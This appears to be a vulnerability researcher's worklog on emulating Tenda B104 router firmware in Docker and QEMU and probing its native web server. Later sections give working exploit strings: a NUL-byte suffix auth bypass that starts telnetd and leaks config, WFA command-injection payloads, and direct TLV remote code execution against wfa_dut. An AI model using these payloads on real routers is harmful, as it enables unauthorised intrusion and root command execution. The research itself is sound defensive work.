# Tenda B104 Firmware Worklog

Date: 2026-04-21

This worklog records the steps taken to download Tenda B104 firmware images,
extract them, build a Dockerized QEMU user-mode environment, investigate the
firmware web UI, and finally launch the native Tenda `httpd` over the network.

## 1. Source And Download Discovery

The starting point was the official Tenda B104 download page:

```text
https://www.tendacn.com/download?urlFlag=B104
```

The Tenda site uses a backend API for the global site. The downloader was
implemented in `scripts/fetch_tenda_b104.py` to collect the listing, write a
local manifest, normalize archive URLs, and download firmware files.

Outputs created:

```text
manifest.json
urls.txt
downloads/download_results.json
```

Observed results:

- The API reported 439 B104 entries.
- 438 entries had downloadable firmware archives.
- The total listed payload size was about 5.0 GB.
- 437 of 438 downloadable archives were retrieved.
- One Tenda URL returned 404:

```text
105643_US_SG04EV1.0re_300000933_en+cn_TDE01(1).zip
https://static.tenda.com.cn/tdeweb/downloads/uploadfile/20241219/US_SG04EV1.0re_300000933_en+cn_TDE01(1).zip
```

Some downloads were recorded as `exists-size-diff` or `downloaded-size-diff`.
That was not treated as corruption because Tenda's API `fileSize` values are
approximate for many older archives and often do not exactly match the HTTP
payload length.

## 2. Firmware Extraction

The extractor was implemented in `scripts/extract_firmware.py`.

It handles:

- ZIP/RAR/7z-style archive inputs where supported by the container tools.
- Tenda `.bin` images with a small vendor header.
- Gzip-compressed tar payloads inside Tenda `.bin` images.
- SquashFS root filesystems.
- Architecture detection from the extracted rootfs binaries.

The newest sample used for most testing was:

```text
downloads/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip
```

That archive contains a Tenda `.bin`. The `.bin` contains a short vendor header,
then a gzip-compressed tar archive with Android-style boot images and
`root.squashfs`.

The extracted root filesystem is OpenWrt:

```text
OpenWrt 21.02.7, r16847-f8282da11e
arch: aarch64
target-ish userland: aarch64_cortex-a55_neon-vfpv4
```

## 3. Dockerized QEMU User-Mode Environment

The initial runtime was built around Docker plus QEMU user-mode, not full board
emulation.

Files created:

```text
Dockerfile
docker-compose.yml
scripts/run_qemu.sh
```

The Docker image installs tooling such as:

```text
binwalk
qemu-user-static
squashfs-tools
jq
p7zip-full
unzip
file
python3
curl
iproute2
net-tools
procps
strace
```

`scripts/run_qemu.sh`:

1. Accepts a firmware archive or an already extracted rootfs.
2. Extracts the archive under `work/extracted/`.
3. Detects architecture.
4. Copies the correct `qemu-*-static` binary into the rootfs.
5. Mounts minimal `/proc`, `/sys`, `/dev`, and `/dev/pts`.
6. Enters the firmware rootfs with `chroot`.
7. Runs either an interactive shell or `FIRMWARE_CMD`.

Smoke test command:

```bash
docker compose run --rm \
  -e FIRMWARE_ARCHIVE=/firmware/downloads/795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip \
  -e FIRMWARE_CMD='cat /etc/openwrt_release; echo ARCH=$(uname -m)' \
  firmware-qemu
```

This verified that the OpenWrt userland could run under QEMU user-mode.

## 4. Native Web Server Investigation

The extracted firmware contains the native web components:

```text
/www
/usr/sbin/httpd
/usr/sbin/dhttpd
/etc/init.d/httpd
/etc/init.d/dhttpd
/etc/init.d/td_server
/bin/ubus
/sbin/ubusd
/usr/lib/libtd_common.so
/lib/libubus.so.20210603
```

`/usr/sbin/httpd` is an AArch64 ELF binary. Strings and symbol inspection showed
native route handling for paths such as:

```text
/login/Auth
/login/Usernum
/goform/getModules
/goform/setModules
/goform/
```

The first goal was to start the real firmware `httpd` inside the QEMU chroot and
publish it through Docker.

Initial attempts started firmware daemons manually:

```text
ubusd
logd
nvram_daemon
td_server
httpd
dhttpd
```

Docker was configured to publish:

```text
127.0.0.1:18080 -> container port 80
127.0.0.1:18443 -> container port 443
```

Observed failure:

- `curl` to the published port connected to Docker's proxy and then reset.
- Inside the container, `/proc/net/tcp`, `ss`, and `netstat` showed no usable
  listener from `httpd`.
- `httpd` logs repeatedly showed:

```text
cgi main -> if addr=
```

That indicated `httpd` was stuck waiting for a valid LAN IP/interface state.

## 5. Network/ubus Attempts That Did Not Work

Several attempts were made to satisfy the firmware's expected OpenWrt LAN state
without stubbing.

Tried approaches:

- Creating or assigning `br-lan`.
- Assigning `192.168.0.1`.
- Trying to make the container interface look like the firmware LAN.
- Starting native OpenWrt `ubusd`.
- Starting or experimenting with `netifd`.
- Adjusting `/etc/config/network` to use container-visible interfaces.
- Trying explicit `httpd` bind variants.
- Trying `dhttpd` directly.

Important failures:

- Without `netifd`, `ubus` did not expose `network.interface.lan`.
- With `netifd`, `network.interface.lan` appeared, but:

```bash
ubus call network.interface.lan status
```

  hung instead of returning useful JSON.

- `ifup lan` also hung in the network reload path.
- The firmware expects board-specific state that does not naturally exist in a
  Docker plus QEMU user-mode chroot: bridge/switch devices, modem interfaces,
  board scripts, vendor config, and `ubus` network state.

Conclusion at this stage:

The blocker was not the web assets. The blocker was that native `httpd` wanted a
valid LAN IP from the firmware/OpenWrt board network stack before binding its
socket.

## 6. Temporary Compatibility Web UI

To give a browser-reachable UI while native `httpd` was still blocked, a
compatibility server was created:

```text
scripts/webui_compat_server.py
scripts/launch_webui.sh
```

This server:

- Served the extracted `/www` assets.
- Stubbed JSON responses for common UI endpoints.
- Accepted login requests at `/login/Auth`.
- Returned basic responses for `/goform/getModules` and `/goform/setModules`.

This allowed the static Vue web UI to load in a browser, but it was not the real
firmware web backend.

Issue found:

- `scripts/extract_firmware.py` deletes and recreates the extraction workdir on
  each extraction.
- The compatibility launcher could race the extraction and start before
  `www/login.html` existed.

Workaround added:

- `scripts/launch_webui.sh` waits for the extracted `login.html` before starting
  the compatibility server.

Important clarification:

The compatibility server was explicitly not connected to native `httpd`. It was
only useful for UI inspection and was not suitable for backend behavior or web
vulnerability testing.

## 7. Decision: Stub Only The LAN Dependency, Keep Native httpd

After confirming the compatibility server was not enough, we chose the
native-backed approach:

```text
real firmware httpd
real /www assets
real native route handlers
minimal stub only for LAN discovery/bind startup
```

The alternative was full board/system emulation, but that would require more
hardware-specific artifacts such as kernel, DTB, boot args, partition layout,
U-Boot environment, and possibly real board/modem/switch behavior.

## 8. Root Cause Found In httpd Startup

Disassembly and symbol inspection showed that `httpd` calls:

```c
td_common_get_interface_ip(ctx, "lan", ip_buffer, 16)
```

in a loop until the buffer contains a syntactically valid IPv4 address.

Relevant startup behavior:

1. `httpd` connects to `ubus`.
2. It asks Tenda helper library code for the LAN IP.
3. The helper path eventually depends on `ubus`/network state.
4. If the returned IP is blank or invalid, startup loops.
5. Once an IP is valid, `httpd` creates sockets and calls `bind()`/`listen()`.

This made a narrow shim possible.

## 9. Final Native Solution

Files added/changed:

```text
scripts/native_httpd_shim.c
scripts/launch_native_httpd.sh
scripts/run_qemu.sh
Dockerfile
README.md
```

`scripts/native_httpd_shim.c` is a small AArch64 shared library. It exports two
symbols:

```c
td_common_get_interface_ip(...)
bind(...)
```

The shim behavior is:

- `td_common_get_interface_ip(...)` returns:

```text
192.168.0.1
```

  This satisfies the native `httpd` startup loop.

- `bind(...)` rewrites IPv4 bind addresses to:

```text
0.0.0.0
```

  This allows Docker to publish the service to the host even though `httpd`
  believes it is using the firmware LAN IP.

The Dockerfile now installs:

```text
gcc-aarch64-linux-gnu
```

and builds the shim with:

```bash
aarch64-linux-gnu-gcc \
  -nostdlib -shared -fPIC -O2 -ffreestanding -fno-builtin -fno-stack-protector \
  -Wl,-soname,libtenda-httpd-shim.so \
  -o /opt/tenda-b104/libtenda-httpd-shim.so \
  /opt/tenda-b104/scripts/native_httpd_shim.c
```

`scripts/run_qemu.sh` copies the compiled shared object into the firmware rootfs
at:

```text
/tmp/libtenda-httpd-shim.so
```

`scripts/launch_native_httpd.sh` starts a single container:

```text
tenda-b104-native-httpd
```

It runs:

```text
ubusd
logd
nvram_daemon, if present
td_server, if present
LD_PRELOAD=/tmp/libtenda-httpd-shim.so /usr/sbin/httpd
```

and publishes:

```text
127.0.0.1:18080 -> container port 80
```

The launcher also waits until:

```text
http://127.0.0.1:18080/login.html
```

responds before printing the URL.

## 10. Final Verification

Build:

```bash
cd /d1/cb/firmware_lookup/tenda_b104
docker compose build
```

Launch:

```bash
./scripts/launch_native_httpd.sh
```

Expected output:

```text
Native firmware httpd container: tenda-b104-native-httpd
URL: http://127.0.0.1:18080/login.html
```

Current verified container state:

```text
tenda-b104-native-httpd Up
127.0.0.1:18080->80/tcp
```

Inside the container, native `httpd` listens:

```text
LISTEN 0 128 0.0.0.0:80  0.0.0.0:* users:(("httpd",pid=...,fd=7))
LISTEN 0 128 0.0.0.0:443 0.0.0.0:* users:(("httpd",pid=...,fd=8))
```

HTTP verification:

```bash
curl -i http://127.0.0.1:18080/login.html
```

returned native firmware headers and the Tenda page:

```text
HTTP/1.0 200 OK
Server: Http Server
<title>Tenda Web Master</title>
```

Login route verification:

```bash
curl -sS \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}' \
  http://127.0.0.1:18080/login/Auth
```

returned:

```json
{"errCode":0}
```

The native `httpd` log showed:

```text
cgi main -> if addr=192.168.0.1
httpd listen ip = 192.168.0.1 port = 80
httpd listen ip = 192.168.0.1 port = 443
```

The log still says `192.168.0.1` because that is the LAN IP returned to the
firmware. The shim rewrites the actual IPv4 `bind()` call to `0.0.0.0` so the
service is reachable through Docker.

## 11. Known Limitations

This is still QEMU user-mode, not full board emulation.

What is real:

- Tenda `/usr/sbin/httpd`
- Tenda `/www` assets
- Native login route
- Native `/goform/*` route handling
- Native supporting daemons that can run in the chroot

What is stubbed:

- The LAN IP result returned to `httpd` startup.
- The IPv4 bind address used by `httpd`, so Docker can publish it.

What may still be incomplete:

- Routes depending on real modem state.
- Routes depending on switch/bridge hardware.
- Routes depending on full `netifd`/board hotplug state.
- HTTPS. The firmware opens port 443, but TLS handshake testing reset under this
  QEMU chroot, so the supported URL is plain HTTP on port 18080.

## 12. Final User URL

Use:

```text
http://127.0.0.1:18080/login.html
```

Relaunch with:

```bash
cd /d1/cb/firmware_lookup/tenda_b104
./scripts/launch_native_httpd.sh
```

## 13. Runtime Log Streaming

The native launcher was updated to make firmware logs easier to watch while
debugging blocked UI flows such as `quickset.html`.

On startup, `scripts/launch_native_httpd.sh` now truncates and tails the main
firmware log files into Docker stdout, so stale data from a previous run does
not replay into the current stream:

```text
/tmp/httpd.log
/tmp/ubusd.log
/tmp/logd.log
/tmp/nvram_daemon.log
/tmp/td_server.log
/tmp/httpd.qemu-strace.log
/tmp/device_logs.txt
/tmp/hideSsid.log
/var/log/messages
```

That means the simplest live stream is:

```bash
docker logs -f tenda-b104-native-httpd
```

A host-side helper was also added:

```bash
./scripts/stream_native_logs.sh
```

It prints the current container status, firmware processes, listening sockets,
and `ubus list`, then follows known log files under the extracted rootfs. It
also polls for newly created log-like files so that later UI actions can expose
additional firmware logs without restarting the stream.

The launcher also gained an opt-in QEMU user-mode syscall trace for `httpd`:

```bash
ENABLE_HTTPD_QEMU_STRACE=1 ./scripts/launch_native_httpd.sh
```

When enabled, QEMU guest syscall output is captured in
`/tmp/httpd.qemu-strace.log` and appears in both `docker logs -f
tenda-b104-native-httpd` and `./scripts/stream_native_logs.sh`. This is intended
for debugging silent UI hangs where the native web server may be waiting on a
missing file, helper binary, socket, or IPC path.

## 14. Quickset Runtime Proxy Fix

While monitoring `quickset.html`, browser console errors showed:

```text
Uncaught (in promise) TypeError: Cannot read properties of undefined (reading 'internetStatus')
```

The crashing quickset code calls:

```text
/goform/getModules?modules=simWan
```

and then assumes `simWan.slot`, `simWan.internetStatus`, and
`simWan.sim2_profile.internetStatus` exist. Native `httpd` was returning:

```json
{"simWan":{}}
```

because the emulated environment has no real LTE modem state. That meant the
Wi-Fi `Next` button crashed in frontend JavaScript before it could post the
quick setup payload.

A narrow local proxy was added in `scripts/native_webui_proxy.py` and wired into
`scripts/launch_native_httpd.sh`. The public URL remains:

```text
http://127.0.0.1:18080/login.html
```

The native firmware `httpd` upstream was initially published on
`127.0.0.1:18081`. That made it easy to compare native responses, but it also
let a browser tab bypass the proxy and hit the unpatched `simWan` response. The
launcher now keeps the native upstream on Docker's internal bridge by default.
Set `EXPOSE_NATIVE_UPSTREAM=1` when launching only when direct upstream
comparison is needed.

The proxy:

- forwards normal requests to native `httpd`
- normalizes browser-encoded module lists such as `simStatus%2CsimWan`
- strips browser-only headers such as `Referer`, which made native `httpd`
  return `400 Bad HTTP request` when the public proxy port differed from the
  native upstream port
- fills an empty native `simWan` object with a minimal disconnected LTE state
- logs requests to `work/native_webui_proxy.log`

Sequential verification:

```text
POST /login/Auth -> {"errCode":0}
GET /goform/getModules?...modules=simStatus%2CsimWan... -> 200 patched_simWan=1
POST /goform/setModules -> {"errCode":"0"}
```

The log streamer now tails `work/native_webui_proxy.log` along with firmware
logs so browser actions can be correlated with native backend responses.

## 15. Login Lockout Reset

After quickset changed the login password, repeated attempts with the previous
`admin/admin` credentials created a lockout state in:

```text
/tmp/loginLockStatus
```

Example contents:

```text
authErrNum:2,authTime:...
```

The launcher now truncates `/tmp/loginLockStatus` on restart, matching the
router UI instruction to restart before trying again. This clears the lockout
counter but does not reset the configured password.

During verification, native `httpd` also returned redirects with
`Location: http://127.0.0.1:18081/...` because it sees the upstream proxy port.
The proxy now rewrites those `Location` headers back to the public host/port so
the browser remains on `127.0.0.1:18080` and continues using the proxy fixes.
Later browser testing showed the same root cause could recur if the browser was
already on `18081`, so direct host publishing of native `httpd` was disabled by
default.

## 16. Docker Bridge Redirect Leak

After the native upstream was moved off the host port and onto Docker's
internal bridge, the browser reported that `login.html` redirected to:

```text
http://172.17.0.3/quickset.html
```

This was the same redirect class as the earlier `18081` leak, but with the
container IP now exposed in the native `Location` header. A direct check
confirmed the proxy was still forwarding the upstream location:

```text
Location: http://172.17.0.3/index.html
```

The rewrite logic on disk already handled `http://<upstream-host>/...`, but the
running proxy process had been started before that code was loaded. Restarting
only `scripts/native_webui_proxy.py` fixed the active route without restarting
the firmware container or clearing router state.

The proxy was also extended to log every changed `Location` header and to handle
HTTP, HTTPS, and protocol-relative redirects for the current upstream host.
Verification after restart:

```text
Location: http://127.0.0.1:18080/index.html
REWRITE Location http://172.17.0.3/index.html -> http://127.0.0.1:18080/index.html
```

## 17. Hidden Telnet and ATE Route Probe

The attack surface inventory flagged `/goform/telnet` and `/goform/ate` from
`httpd` strings. We verified their live behavior in the running native web
environment.

Initial state:

```text
tcp 0.0.0.0:80  LISTEN /usr/sbin/httpd
tcp 0.0.0.0:443 LISTEN /usr/sbin/httpd
```

No `telnetd` or `td_ate` process was running. Unauthenticated requests to both
hidden routes redirected to `/login.html` and did not start either service.

The earlier failed curl login attempts were caused by using form encoding. The
frontend actually sends JSON:

```text
POST /login/Auth
Content-Type: application/json; charset=UTF-8
{"username":"admin","password":"<md5(login password)>"}
```

Using the configured password `Tenda_888888`, the MD5 value
`fbcd4667f4d4f5d27f4b1250fc051126` succeeded and returned:

```text
{"errCode":0}
Set-Cookie: password=fbcd4667f4d4f5d27f4b1250fc051126qmsyjd; path=/
```

With that authenticated cookie:

```text
GET /goform/telnet
proxy error: BadStatusLine('load telnetd success.')
```

The proxy returned `502` only because native `httpd` emitted the bare string
instead of a valid HTTP status line. The side effect still happened:

```text
tcp6 :::23 LISTEN telnetd
Connection to 172.17.0.3 23 port [tcp/telnet] succeeded!
```

The telnet daemon is therefore not running by default, but the authenticated
web route can start it and make it reachable on the Docker bridge.

Authenticated ATE behaved similarly:

```text
GET /goform/ate
proxy error: BadStatusLine('load mfg success.')
```

This spawned `/usr/sbin/td_ate`. In the emulated environment it did not open a
new TCP listener, but it remained as a persistent manufacturing/test process.

Cleanup:

```text
kill <in-container td_ate pid>
```

After cleanup, no `telnetd` or `td_ate` process remained and listeners were
back to `80/tcp` and `443/tcp` only.

## 18. Web Route Auth Matrix

We tested the recovered native web routes with and without an authenticated
session. Results were recorded in:

```text
ROUTE_PROBE_RESULTS.md
```

Important outcomes:

- `/login/Auth` requires JSON. Form-encoded login attempts are treated as
  failures, which explains the earlier lockout increments.
- Most CGI upload/download routes redirect unauthenticated clients to
  `/login.html`.
- `/goform/getModules` returns `{"errCode":1000}` without auth instead of a
  redirect.
- `/goform/setModules` accepted the benign unauthenticated
  `updateLoginoption` action, so that action appears intentionally available
  before login. This does not prove arbitrary module writes are unauthenticated.
- Authenticated `/cgi-bin/DownloadCfg` returns a router config backup, and
  authenticated `/cgi-bin/DownloadLog` returns a log archive.
- Authenticated `/goform/telnet` and `/goform/ate` still spawn their native
  daemons while producing malformed raw HTTP responses at the proxy.

After the matrix run, `telnetd` and `td_ate` were killed and the container was
back to only `80/tcp` and `443/tcp`.

## 19. R07 WFA/Sigma Test Daemon Pass

R07 was investigated after the route matrix. The focused notes are in:

```text
R07_WFA_SIGMA_PROBE_RESULTS.md
```

Main outcome:

- The current runtime remains a web-focused native emulation, not a full
  `rc.d` boot, so WFA/Sigma daemons are not running by default in the live
  container.
- Static startup evidence still shows `S90wfa_dut` and `S92sigma` in the stock
  image.
- `/etc/init.d/wfa_dut` starts before `sigma`, attempts to launch `wfa_dut` on
  `8000` and `8080`, then disables `sigma`.
- `/etc/init.d/sigma`, if run manually or not disabled, starts `wfa_dut` on
  `8000` and `wfa_ca` on `9000`.
- A controlled chroot launch confirmed `wfa_dut lo 8000` opens
  `127.0.0.1:8000/tcp`.
- A controlled chroot launch confirmed `wfa_ca lo 9000`, with
  `WFA_ENV_AGENT_IPADDR=127.0.0.1` and `WFA_ENV_AGENT_PORT=8000`, opens
  `0.0.0.0:9000/tcp` and connects back to `wfa_dut`.
- Both test daemons were killed after probing. Final listener state returned to
  only native `httpd` on `80/tcp` and `443/tcp`.

Important caveat:

`/etc/wireless/l1profile.dat` only contains `INDEX0_main_ifname=ra0;rai0`, with
no `INDEX1_main_ifname`. That makes the stock `wfa_dut` dual-port startup
fragile in the extracted image unless board scripts rewrite the profile during
real boot.

R07 remains High severity because the enabled test daemons expose WFA/Sigma
control handlers backed by shell commands and Wi-Fi/network configuration
changes. A concrete command-injection payload still needs a targeted protocol
harness or fuller boot trace.

## 20. Closer rc.d Boot Probe

After the first R07 pass, a closer `/etc/rc.d` boot probe was run. Full notes
are in:

```text
RCD_BOOT_PROBE_RESULTS.md
```

Three approaches were tried:

- `/sbin/procd rcS S boot` hung immediately outside normal PID-1 startup.
- A bounded `/etc/rc.d/S* boot` walker without `ubusd`/`procd` reached all
  scripts, but most `USE_PROCD=1` services failed with `Failed to connect to
  ubus`.
- A bounded `/etc/rc.d/S* boot` walker with `/sbin/ubusd` and
  `/sbin/procd -S -d 2` prestarted produced the best result.

Best probe container:

```text
tenda-b104-rcd-procd-20260421_214544
```

Final procd-backed listener state included:

```text
172.17.0.6:53/tcp,udp  dnsmasq
0.0.0.0:67/udp         dnsmasq
0.0.0.0:17171/tcp      atcid
0.0.0.0:1883/tcp       mosquitto
:::1883/tcp            mosquitto
0.0.0.0:8000/tcp       wfa_dut
0.0.0.0:9000/tcp       wfa_ca, manually added after stock boot
0.0.0.0:11112/udp      td_mqtt_ucloud
```

The pass also kept many procd-managed daemons alive, including `ubusd`,
`procd`, `logd`, `rpcd`, `netifd`, `odhcpd`, `crond`, `collectd`,
`td_server`, `td_mqtt_ucloud`, `atcid`, `atci_service`, `httpd`, and the
stock-started `wfa_dut`. Native `httpd` started as a process but did not expose
`80/tcp` in this close-to-stock pass because the LAN-IP/bind shim was not used.

For R07 specifically:

- `S90wfa_dut` launched `/sbin/wfa_dut ra0;rai0 8000`.
- The resulting process listened on `0.0.0.0:8000/tcp`.
- `S90wfa_dut` removed the `S92sigma` symlink before the walker reached it, so
  `sigma` did not run in the stock-order boot walk.
- A manually added `wfa_ca` on `9000/tcp` successfully forwarded benign Sigma
  CAPI commands to `wfa_dut`.
- `sta_get_mac_address,interface,ra0` returned
  `status,COMPLETE,mac,00:00:00:00:00:00`.
- `sta_get_ip_config,interface,ra0` returned a structured
  `status,COMPLETE` response with empty IP/mask values, as expected without
  real Wi-Fi state.

## 21. radare2/r2dec Install and Native Handler Decompilation

The host had Ubuntu's packaged `radare2 5.5.0`, but current `r2dec` no longer
supports pre-6 radare2 plugin APIs. Building `r2dec` against 5.5.0 failed with
plugin ABI errors such as missing `RCorePluginSession`, missing
`R2_ABIVERSION`, and changed `r_cons_*` function signatures.

We installed a current radare2 from source under `/usr/local` and then rebuilt
`r2dec`. One build attempt failed because the active conda environment selected
`/home/dyn/anaconda3/bin/x86_64-conda-linux-gnu-cc` and injected
`/home/dyn/anaconda3/include` as a linker input. After `conda deactivate` and a
sanitized environment, `r2pm -ci r2dec` succeeded.

Verification:

```text
r2 -q -c 'pdd?;q' work/test-extract/rootfs_0/usr/sbin/httpd
```

This showed the `pdd` help for the r2dec core plugin, confirming the plugin was
loaded.

Decompilation pass updates were recorded in:

```text
ATTACK_SURFACE_DEEP_DIVE.md
```

Key new findings:

- `/goform/telnet` decompiles to a direct `system("telnetd &")`.
- `/goform/ate` decompiles to direct `system("killall -9 td_ate")` and
  `system("td_ate &")`.
- `td_ate` binds UDP `7329`, AES-CBC decrypts datagrams, and dispatches a
  23-entry manufacturing command table.
- `td_ate` command handlers include `td_common_reboot`, `td_common_restore`,
  NVRAM writes, and an `ifconfig` handler that builds a shell command with
  `strcpy` and calls `system()`.
- `/goform/zerotier` builds a remote `zerotier.tar` URL and execs
  `/usr/sbin/td_zerotier`.
- `td_zerotier` disables HTTPS certificate/host verification for HTTPS URLs,
  extracts `/var/zerotier.tar`, and runs
  `/var/zerotier/start_zerotier.sh`.
- `td_zerotier` still reaches the extract/execute path after a download
  failure, which makes stale `/var/zerotier.tar` state dangerous.
- The HTTP upload path was confirmed as fixed-path write, mmap, multipart parse,
  truncation, backend call, and cleanup-on-backend-failure.
- The main `httpd` auth/router function also handles `/login/Auth`,
  `/logout/Auth`, `/login/Usernum`, `/goform/getModules`,
  `/goform/setModules`, and `/goform/WifiApScan`. r2dec confirmed the
  `updateLoginoption` and `loginLockStatus` pre-auth exceptions rather than a
  blanket unauthenticated `/goform` write path.

## 22. Auth Deep Dive and Confirmed Bypass

We then focused specifically on whether the native web auth could be bypassed.
The detailed notes are in:

```text
AUTH_DEEP_DIVE.md
```

The configured runtime rootfs had quickset completed and the login password set
to the MD5 of `Tenda_888888`:

```text
option quickset_cfg '0'
option username 'admin'
option userpass 'fbcd4667f4d4f5d27f4b1250fc051126'
```

The factory extracted config still showed an empty `userpass`, but the bypass
below works in the configured/password-protected runtime state.

Static auth findings:

- Main auth/router function: `httpd:0x418378`.
- Login expects JSON at `/login/Auth`:
  `{"username":"admin","password":"<md5(password)>"}`.
- `Set-Cookie` is emitted as `password=%s; path=/` without `HttpOnly`,
  `Secure`, or `SameSite`.
- The CSRF helper at `httpd:0x417e68` permits missing `Referer` or missing
  `Host`, making it weak even for authenticated sessions.
- The auth gate skips login checks for static-looking suffixes such as `.js`,
  `.css`, `.png`, `.gif`, and `jpeg`.
- The goform dispatcher at `httpd:0x409b40` later resolves the NUL-truncated
  form name and calls the registered handler.

Confirmed unauthenticated bypass:

```text
GET /goform/telnet%00.js
```

The proxy returned a 502 because the native handler writes a bare hidden-route
status body, but `telnetd` started and opened `*:23`.

```text
GET /goform/ate%00.js
```

This started `td_ate` and opened UDP `0.0.0.0:7329`.

The same primitive affected protected downloads:

```text
GET /cgi-bin/DownloadCfg%00.js -> 200 16720 config/conf
GET /cgi-bin/DownloadLog%00.js -> 200 308224 config/conf
```

Normal unauthenticated controls still redirected:

```text
GET /goform/telnet       -> 302 /login.html
GET /cgi-bin/DownloadCfg -> 302 /login.html
```

Other controls:

- `/goform/telnet%00` without a static suffix still redirected to login.
- `/goform/telnet%2ejs` still redirected to login.
- `/goform/ate.js` bypassed the auth redirect but did not dispatch the hidden
  handler; it returned `Form ate.js is not defined`.
- `/public/../goform/telnet` and `/lang/../goform/ate` returned
  `400 Bad HTTP request` and did not spawn handlers.

We also confirmed that `POST /goform/setModules%00.js` reaches the broad write
route unauthenticated. The test body used an intentionally invalid module name
to avoid changing device state:

```text
POST /goform/setModules {"noSuchModule":"x"}       -> {"errCode":1000}
POST /goform/setModules%00.js {"noSuchModule":"x"} -> {"errCode":""}
```

Final assessment: this is a critical route-confusion auth bypass. The auth gate
classifies the request as a static asset because of the suffix after `%00`, but
the dispatcher resolves the decoded C string as the protected route before the
NUL. Any exposed management interface should be considered unauthenticated for
the affected route classes until URL canonicalization and per-handler auth are
fixed.

## 23. Live Command-Injection Probes In rc.d Container

The current close-to-`rc.d` target is still:

```text
tenda-b104-rcd-procd-20260421_214544
```

`wfa_dut` remained up on `0.0.0.0:8000/tcp`. `wfa_ca` was restarted on
`0.0.0.0:9000/tcp` as needed with `WFA_ENV_AGENT_IPADDR=172.17.0.6` and
`WFA_ENV_AGENT_PORT=8000`.

Confirmed WFA command injection:

- `sta_get_mac_address,interface,ra0;echo WFA_IFACE>/tmp/wfa_inj_iface;#`
  returned `status,COMPLETE` and created `/tmp/wfa_inj_iface`.
- `sta_get_ip_config,interface,ra0;echo WFA_IPCFG>/tmp/wfa_inj_ipcfg;#`
  returned `status,COMPLETE` and created `/tmp/wfa_inj_ipcfg`.
- `sta_set_ip_config` truncates fields, but a short `ip` payload
  `1;>/tmp/x;#` returned `status,COMPLETE` and created `/tmp/x`.

Crash-only WFA leads in this harness:

- `sta_verify_ip_connection` destination injection returned only
  `status,RUNNING`, created no marker, and crashed `wfa_ca`.
- `traffic_send_ping` destination injection also created no marker and crashed
  `wfa_ca`.

Other live-service checks:

- `atcid` on `17171/tcp` accepted AT commands; `AT+GMM` returned
  `RG600L-EU`.
- A semicolon marker probe against `atcid` returned `CME ERROR: 6666` and
  created no marker. Static strings show a special-character denylist
  containing ``;|&<>$``.
- `td_mqtt_ucloud` still has a static upgrade command template
  `wget -cO %s %s &`, but the live broker uses a password file and no
  unauthenticated MQTT-to-command path has been proven yet.

PoC write-up:

```text
R07_WFA_COMMAND_INJECTION_POC.md
```

## 24. Direct `wfa_dut:8000` Command Injection

The remaining R07 exposure question was whether exploitation required the
manually added `wfa_ca:9000`, or whether the stock-started `wfa_dut:8000`
listener was enough.

Result: `wfa_ca` is not required.

Method:

- Started a temporary `wfa_dut` on `8010`.
- Placed a Python TCP proxy between `wfa_ca` and that temporary DUT listener.
- Sent `sta_get_mac_address,interface,lo` through `wfa_ca`.
- Captured the binary DUT frame:

```text
tag    0x000c
length 0x0274
payload starts with the interface string and is NUL-padded
total frame length 632 bytes
```

Direct exploit checks:

- A crafted TLV sent directly to temporary `wfa_dut:8010` with payload
  `lo;echo DIRECT8010>/tmp/direct_poc;#` created `/tmp/direct_poc`.
- The same TLV format sent directly to the stock/default `wfa_dut:8000` with
  payload `ra0;echo DIRECT8000>/tmp/direct_8000;#` created
  `/tmp/direct_8000`.

The stock-started `wfa_dut:8000` listener therefore exposes unauthenticated
command injection by itself if reachable from LAN/Wi-Fi. The remaining hardware
question is network exposure policy, not whether `sigma` or `wfa_ca` is needed.

Report-ready finding:

```text
FINDING_R07_WFA_DUT_UNAUTH_RCE.md
```

## 25. Standalone PoC Suite

Standalone Python PoCs were added under:

```text
pocs/
```

The suite covers the confirmed web auth bypass routes, ZeroTier archive
execution, session/CSRF weaknesses, WFA Sigma text command injection, and direct
raw-TLV exploitation of `wfa_dut:8000`.

Validation summary:

- `/goform/telnet%00.js` spawned `telnetd` and opened tcp/23; cleanup removed
  the daemon.
- `/goform/ate%00.js` spawned `td_ate` and opened udp/7329; cleanup removed
  the daemon.
- `/cgi-bin/DownloadCfg%00.js` downloaded a 16,720-byte config backup.
- `/cgi-bin/DownloadLog%00.js` downloaded a 310,272-byte log archive.
- `/goform/getModules%00.js` and `/goform/setModules%00.js` reached protected
  read/write APIs without a valid session.
- `/goform/zerotier%00.js` fetched a PoC `zerotier.tar`, extracted it, and
  executed `start_zerotier.sh` as `uid=0(root)` once the emulated network-status
  shim returned connected state.
- The login cookie was confirmed missing `HttpOnly`, `Secure`, and `SameSite`.
- Authenticated `/goform/ate` with no `Referer` confirmed the CSRF/state-change
  weakness.
- WFA text-command PoCs for `sta_get_mac_address`, `sta_get_ip_config`, and
  `sta_set_ip_config` created marker files in the firmware rootfs.
- A direct little-endian TLV frame to stock `wfa_dut:8000` created
  `/tmp/direct_8000`, confirming `wfa_ca` is not required for the WFA RCE if
  the DUT port is reachable.

An earlier reverse-shell WFA test left child shell/netcat processes inheriting
the `wfa_dut` listener file descriptor. That caused later WFA commands to return
only `status,RUNNING`. Restarting just `wfa_dut` and `wfa_ca` restored clean
`status,COMPLETE` behavior without restarting the full firmware container.

Detailed validation evidence is recorded in:

```text
POC_RESULTS.md
```

## 26. Manual Telnet Validation

After running:

```bash
python3 ./firmware_lookup/tenda_b104/pocs/poc_auth_bypass_telnet.py --no-cleanup
```

`nc -v 172.17.0.3 23` confirmed the unauthenticated route had opened the TCP
listener. A direct `telnet 172.17.0.3 23` initially connected and then closed.

`strace` on `telnetd` showed the first failure:

```text
openat(AT_FDCWD, "/dev/ptmx", O_RDWR) = -1 ENOENT
telnetd[...]: can't find free pty
```

The native-httpd chroot had `/dev/pts/ptmx` but no `/dev/ptmx`, and `devpts`
was mounted with restrictive `ptmx` permissions. The runtime fix was:

```bash
docker exec tenda-b104-native-httpd /bin/sh -lc '
pid=$(ps | awk "/[h]ttpd/{print \$1; exit}")
root=$(readlink /proc/$pid/root)
[ -e "$root/dev/ptmx" ] || ln -s pts/ptmx "$root/dev/ptmx"
mount -o remount,mode=620,ptmxmode=666 "$root/dev/pts" 2>/dev/null || true
'
```

After relaunching `telnetd`, a traced connection showed successful pty
allocation:

```text
openat(AT_FDCWD, "/dev/ptmx", O_RDWR) = 5
openat(AT_FDCWD, "/dev/pts/0", O_RDWR) = 0
execve("/bin/login", ["/bin/login"], ...)
```

The manual test then reached the firmware login prompt:

```text
